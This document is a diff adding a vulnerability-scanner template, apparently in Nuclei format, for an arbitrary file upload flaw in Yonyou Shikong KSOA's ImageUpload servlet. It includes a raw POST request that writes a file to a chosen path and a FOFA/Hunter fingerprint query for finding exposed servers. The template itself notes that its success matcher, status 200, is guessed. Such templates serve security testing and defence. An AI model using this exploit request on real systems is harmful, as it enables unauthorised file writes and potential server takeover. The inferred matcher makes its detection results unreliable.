@@ -1,0 +1,36 @@
+id: poc-f6255a6e6c929ee5f8be
+info:
+  name: 用友时空KSOAImageUpload任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/f6255a6e6c929ee5f8be5a3f356eaa6c
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: f6255a6e6c929ee5f8be5a3f356eaa6c
+    fofa: + hunter`app.name="用友时空 KSOA"`
+http:
+- raw:
+  - 'POST /servlet/com.sksoft.bill.ImageUpload?filename=1.txt&filepath=/ HTTP/1.1
+
+    User-Agent: Java/1.8.0_381
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Content-type:
+
+    Content-Length: 5
+
+    Connection: close
+
+
+    hello'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
